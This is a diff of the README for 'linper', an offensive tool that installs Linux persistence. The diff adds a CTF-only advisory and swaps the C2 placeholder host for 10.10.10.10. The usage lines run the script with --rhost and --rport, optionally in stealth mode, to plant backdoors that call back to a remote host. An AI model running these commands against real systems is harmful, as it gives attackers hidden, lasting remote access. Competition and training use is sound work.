@@ -4,18 +4,22 @@ Automated Linux Persistence Establishment
 
 Automatically install multiple methods of persistence, or just enumerate possible methods.
 
+## advisory
+
+This was developed with CTFs in mind and that is its intended use case. The stealth-mode option is for King of the Hill style competitions where others might try and tamper with your persistence. Please do not use this tool in an unethical or illegal manner.
+
 ## files
 
 - README.md - or not
 - TODO.md - planned fixes & enhancements
-- linper.sh - execute on target
+- linper.sh - execute me
 - gtfobins/ - directory containing (possibly modified) snippets of code from [gtfobins](https://gtfobins.github.io/) as I am working on integrating them into the overall script
 
 ## usage
 
 Enumerate all persistence methods and install
 
-`bash linper.sh --rhost myc2.host.domain --rport 4444`
+`bash linper.sh --rhost 10.10.10.10 --rport 4444`
 
 Enumerate and do not install
 
@@ -23,7 +27,7 @@ Enumerate and do not install
 
 Enumerate all persistence methods and install (stealth mode)
 
-`bash linper.sh --rhost myc2.host.domain --rport 4444 --stealth-mode`
+`bash linper.sh --rhost 10.10.10.10 --rport 4444 --stealth-mode`
 
 ## methodology
 
